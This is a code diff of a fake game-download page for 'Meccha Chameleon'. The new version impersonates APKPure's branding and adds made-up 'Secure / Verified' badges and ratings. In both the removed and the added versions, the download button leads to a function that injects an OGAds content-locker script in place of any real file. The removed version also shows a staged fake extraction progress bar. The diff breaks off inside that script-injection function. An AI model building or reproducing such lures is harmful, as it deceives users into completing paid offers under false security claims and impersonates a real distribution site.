@@ -3,201 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meccha Chameleon - Distribution Hub</title>
+    <title>Meccha Chameleon Download for Android - APKPure</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #080b11; }
-        .smooth-slide { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        body { font-family: 'Roboto', sans-serif; background-color: #f6f8fa; }
+        .apk-green { background-color: #24a159; }
+        .apk-text-green { color: #24a159; }
     </style>
 </head>
-<body class="text-slate-300 antialiased select-none">
+<body class="text-slate-800 antialiased select-none">
 
-    <!-- Top Clean Interface Nav -->
-    <header class="border-b border-slate-900 bg-[#0c101b] px-6 py-4 sticky top-0 z-40">
-        <div class="max-w-2xl mx-auto flex items-center justify-between">
+    <!-- APKPure Official Header Replica -->
+    <header class="apk-green text-white px-4 py-3 sticky top-0 z-40 shadow-sm">
+        <div class="max-w-xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-3">
-                <img src="meccha.jpg" alt="Logo" class="w-7 h-7 rounded-md object-cover">
-                <span class="text-xs font-semibold text-white uppercase tracking-wider font-mono">Package Deploy Node</span>
+                <!-- Menu Icon -->
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+                <span class="font-bold text-lg tracking-tight">APKPure</span>
             </div>
-            <span class="text-[11px] bg-slate-900 border border-slate-800 text-slate-500 px-2 py-0.5 rounded font-mono">v1.0.4</span>
+            <!-- Search Icon -->
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
         </div>
     </header>
 
-    <!-- App Container -->
-    <main class="max-w-2xl mx-auto px-6 py-20">
+    <!-- Breadcrumb -->
+    <div class="max-w-xl mx-auto px-4 pt-3 text-xs text-slate-500 font-medium">
+        Home > Games > Casual > <span class="text-slate-800">Meccha Chameleon</span>
+    </div>
+
+    <!-- Main Content App Card -->
+    <main class="max-w-xl mx-auto px-4 pt-4 pb-24 space-y-6">
         
-        <!-- Minimal Presentation Card -->
-        <div class="bg-[#0c101b] border border-slate-900 rounded-2xl p-8 space-y-6 text-center md:text-left flex flex-col md:flex-row items-center gap-8 shadow-xl">
-            <img src="meccha.jpg" alt="Meccha Chameleon Image" class="w-32 h-32 rounded-2xl object-cover border border-slate-800 shadow-md">
-            <div class="flex-1 space-y-4">
-                <div class="space-y-1">
-                    <h1 class="text-xl sm:text-2xl font-bold text-white tracking-tight">Meccha Chameleon Mobile</h1>
-                    <p class="text-slate-500 text-xs tracking-wide">Multiplayer Client Bundle</p>
-                </div>
-                <p class="text-slate-400 text-xs sm:text-sm leading-relaxed">
-                    Access the official release build. Download and extract the package assets directory to start your application setup.
-                </p>
-                <div class="pt-2">
-                    <button onclick="openFileExplorer()" class="w-full sm:w-auto bg-blue-600 hover:bg-blue-500 text-white font-medium text-xs px-6 py-3 rounded tracking-wide uppercase transition-all shadow-md active:scale-98 cursor-pointer">
-                        Download Mobile Build (184 MB)
-                    </button>
-                </div>
+        <!-- App Identity -->
+        <div class="flex gap-4 items-start bg-white p-4 rounded-xl border border-slate-100 shadow-xs">
+            <img src="meccha.jpg" alt="Meccha Chameleon" class="w-20 h-20 rounded-2xl object-cover border border-slate-100">
+            <div class="space-y-1 flex-1">
+                <h1 class="text-lg font-bold text-slate-900 leading-tight">Meccha Chameleon</h1>
+                <p class="text-xs text-slate-500">lemorion_1224</p>
+                <p class="text-[11px] font-mono text-slate-400">1.71.125</p>
             </div>
+        </div>
+
+        <!-- App Stats Row -->
+        <div class="grid grid-cols-4 gap-1 text-center bg-white py-3 rounded-xl border border-slate-100 shadow-xs text-xs">
+            <div class="border-r border-slate-100"><p class="text-slate-900 font-bold">4.9 ★</p><p class="text-[10px] text-slate-400">Reviews</p></div>
+            <div class="border-r border-slate-100"><p class="text-slate-900 font-bold">2026</p><p class="text-[10px] text-slate-400">Updated</p></div>
+            <div class="border-r border-slate-100"><p class="text-emerald-600 font-bold">✓ Secure</p><p class="text-[10px] text-slate-400">Verified</p></div>
+            <div><p class="text-slate-900 font-bold">Everyone</p><p class="text-[10px] text-slate-400">Content</p></div>
+        </div>
+
+        <!-- THE MAIN APKPURE DOWNLOAD BUTTON -->
+        <div class="pt-2">
+            <button onclick="triggerFilePopUp()" class="w-full apk-green hover:bg-[#1e8549] text-white font-bold py-4 rounded-xl shadow-md text-sm flex items-center justify-center gap-2 transition-all active:scale-98 cursor-pointer">
+                <!-- Download Cloud Icon -->
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>
+                Download APK (184.5 MB)
+            </button>
+        </div>
+
+        <!-- Description Box -->
+        <div class="bg-white p-4 rounded-xl border border-slate-100 shadow-xs space-y-2">
+            <h3 class="text-xs font-bold uppercase tracking-wider text-slate-400">About this game</h3>
+            <p class="text-xs text-slate-600 leading-relaxed">
+                Official release client package. Experience the absolute hide and seek casual multiplayer setup directly on your mobile device.
+            </p>
         </div>
 
     </main>
 
-    <!-- Clean Layout Footer -->
-    <footer class="fixed bottom-6 left-0 right-0 text-center text-[10px] text-slate-600 font-mono">
-        <p>© 2026 Meccha Chameleon Release Center. Verified Stable.</p>
+    <!-- Footer Information -->
+    <footer class="py-6 text-center text-[10px] text-slate-400 font-mono">
+        <p>© 2026 APKPure Hub. Developed for Meccha Chameleon.</p>
     </footer>
 
 
-    <!-- ==================== PREMIUM FILE DIRECTORY MANAGER ==================== -->
-    <div id="fileModal" class="hidden fixed inset-0 bg-black/75 z-50 flex items-center justify-center p-4 backdrop-blur-xs smooth-slide">
-        <div class="bg-[#0c101b] border border-slate-900 w-full max-w-sm rounded-xl overflow-hidden shadow-2xl flex flex-col">
+    <!-- ==================== EXACT VIDEO POP-UP REPLICA ==================== -->
+    <div id="downloadModal" class="hidden fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-6 backdrop-blur-xs">
+        <div class="bg-white w-full max-w-sm rounded-2xl overflow-hidden shadow-2xl border border-slate-100 p-5 space-y-6 relative animate-fade-in">
             
-            <!-- Folder Title Bar -->
-            <div class="bg-slate-950 px-4 py-3 border-b border-slate-900 flex items-center justify-between">
-                <span class="text-[11px] font-medium text-slate-400 font-mono">Directory: /meccha_client_build/</span>
-                <button onclick="closeFileExplorer()" class="text-slate-500 hover:text-slate-300 text-xs cursor-pointer">✕</button>
+            <!-- Mini Info Notice Icon -->
+            <div class="flex items-center gap-2 text-blue-500 bg-blue-50 p-2.5 rounded-lg border border-blue-100">
+                <svg class="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/></svg>
+                <p class="text-[11px] text-blue-700 font-medium">System Update Checklist Active</p>
             </div>
 
-            <!-- List of Extracted Content -->
-            <div class="p-4 bg-[#0a0d16] divide-y divide-slate-900 font-mono text-xs">
-                <div class="flex items-center justify-between py-3">
-                    <div>
-                        <p class="font-medium text-slate-300">game_assets.bin</p>
-                        <p class="text-[9px] text-slate-600">Archive Package</p>
-                    </div>
-                    <span class="text-slate-600 text-[10px]">162 MB</span>
-                </div>
-                <div class="flex items-center justify-between py-3">
-                    <div>
-                        <p class="font-medium text-slate-300">audio_stream.dat</p>
-                        <p class="text-[9px] text-slate-600">Sound Engine</p>
-                    </div>
-                    <span class="text-slate-600 text-[10px]">22 MB</span>
-                </div>
-                <div class="flex items-center justify-between py-3 bg-blue-950/20 px-2 rounded border border-blue-900/20">
-                    <div>
-                        <p class="font-medium text-blue-400">setup_installer.apk</p>
-                        <p class="text-[9px] text-blue-500/60">Executable Package</p>
-                    </div>
-                    <span class="text-emerald-500 font-medium text-[10px]">Ready</span>
-                </div>
-            </div>
-
-            <!-- Directory Interaction Row -->
-            <div class="bg-slate-950 p-4 border-t border-slate-900 flex items-center justify-between">
-                <span class="text-[10px] text-slate-600 font-mono">3 Files Selected</span>
-                <button onclick="runExtractionProcess()" class="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-5 py-2 rounded text-xs cursor-pointer uppercase tracking-wide transition-all">
-                    Unpack & Install
-                </button>
-            </div>
-
-        </div>
-    </div>
-
-
-    <!-- ==================== REAL LOOKING EXTRACTION PROGRESS WINDOW ==================== -->
-    <div id="loadingModal" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
-        <div class="bg-[#0c101b] border border-slate-900 w-full max-w-xs rounded-xl p-6 text-center space-y-4 shadow-2xl">
-            <div class="space-y-1 font-mono">
-                <h4 class="text-xs font-semibold text-white uppercase tracking-wider">Unpacking Client Archive</h4>
-                <p id="extraction-log" class="text-[10px] text-slate-500">Initializing environment...</p>
-            </div>
-            
-            <!-- Real Tech Bar -->
-            <div class="w-full bg-slate-950 rounded-full h-1.5 overflow-hidden border border-slate-900">
-                <div id="extraction-progress" class="bg-blue-500 h-full w-0 rounded-full transition-all duration-75"></div>
-            </div>
-            
-            <span id="extraction-percent" class="text-[11px] font-mono text-blue-400 block">0%</span>
-        </div>
-    </div>
-
-
-    <!-- ==================== PREMIUM GATEWAY SCREEN (THE LOCKER HOOK) ==================== -->
-    <div id="lockerModal" class="hidden fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
-        <div class="bg-[#0c101b] border border-slate-900 w-full max-w-xs rounded-xl p-6 text-center space-y-5 shadow-2xl">
-            
-            <div class="space-y-1.5">
-                <h3 class="text-white font-bold text-base tracking-tight">Required Verification</h3>
-                <p class="text-slate-400 text-xs leading-relaxed px-1">
-                    To process the device file extraction and start the client application, a quick mobile verification is required.
+            <!-- Direct Content Text (Plain English) -->
+            <div class="space-y-2 text-center sm:text-left">
+                <h2 class="text-slate-900 font-bold text-lg tracking-tight">Download Ready</h2>
+                <p class="text-slate-500 text-xs leading-relaxed">
+                    Your package download is currently available. Click open below to complete verification and launch setup.
                 </p>
             </div>
 
-            <!-- Plain English Direct Flow Steps -->
-            <div class="bg-slate-950 p-3.5 rounded border border-slate-900 text-left space-y-1 text-[10px] text-slate-500 font-mono">
-                <p>1. Click the verification action bar.</p>
-                <p>2. Complete one network target query.</p>
-                <p>3. Installation starts automatically.</p>
-            </div>
-
-            <!-- Unshakable Clean CPA Button -->
-            <div class="pt-1">
-                <button onclick="triggerOgadsLocker()" class="cursor-pointer block w-full text-center font-bold text-white bg-blue-600 hover:bg-blue-500 py-3.5 rounded text-xs uppercase tracking-wide transition-colors shadow-md">
-                    Verify & Finalize Install
+            <!-- The Big Action Button -->
+            <div class="pt-2">
+                <button onclick="executeOgadsFlow()" class="w-full bg-slate-900 hover:bg-black text-white font-medium py-3.5 rounded-xl text-xs transition-all shadow-md tracking-wider cursor-pointer text-center block">
+                    Open Installer
                 </button>
             </div>
 
-            <p class="text-[9px] text-slate-700 font-mono tracking-tighter">Secure distribution tunnel endpoint</p>
+            <!-- Close Action Area -->
+            <div class="text-center pt-1">
+                <button onclick="closeFilePopUp()" class="text-slate-400 hover:text-slate-600 text-xs font-medium cursor-pointer">Cancel Process</button>
+            </div>
+
         </div>
     </div>
 
 
-    <!-- ==================== ADVANCED FUNCTIONAL PIPELINE ==================== -->
+    <!-- ==================== LOGIC ACTIONS ==================== -->
     <script>
-        function openFileExplorer() {
-            document.getElementById('fileModal').classList.remove('hidden');
+        function triggerFilePopUp() {
+            document.getElementById('downloadModal').classList.remove('hidden');
         }
 
-        function closeFileExplorer() {
-            document.getElementById('fileModal').classList.add('hidden');
+        function closeFilePopUp() {
+            document.getElementById('downloadModal').classList.add('hidden');
         }
 
-        function runExtractionProcess() {
-            // Close file window and open the dynamic fake process bar
-            document.getElementById('fileModal').classList.add('hidden');
-            document.getElementById('loadingModal').classList.remove('hidden');
-
-            let currentProgress = 0;
-            const progressFill = document.getElementById('extraction-progress');
-            const percentText = document.getElementById('extraction-percent');
-            const logText = document.getElementById('extraction-log');
-
-            const operationLogs = [
-                "Reading assets_package.bin...",
-                "Allocating sound libraries...",
-                "Configuring device binary path...",
-                "Verification sequence requested..."
-            ];
-
-            const taskRunner = setInterval(() => {
-                currentProgress += 2;
-                progressFill.style.width = currentProgress + '%';
-                percentText.innerText = currentProgress + '%';
-
-                if (currentProgress === 20) logText.innerText = operationLogs[0];
-                if (currentProgress === 52) logText.innerText = operationLogs[1];
-                if (currentProgress === 78) logText.innerText = operationLogs[2];
-                if (currentProgress === 94) logText.innerText = operationLogs[3];
-
-                if (currentProgress >= 100) {
-                    clearInterval(taskRunner);
-                    // Move seamlessly to the clean verification trigger
-                    document.getElementById('loadingModal').classList.add('hidden');
-                    document.getElementById('lockerModal').classList.remove('hidden');
-                }
-            }, 45); // Smooth timing configuration
-        }
-
-        function triggerOgadsLocker() {
+        function executeOgadsFlow() {
             var ogScript = document.createElement('script');
             ogScript.type = 'text/javascript';
             ogScript.id = 'ogjs';
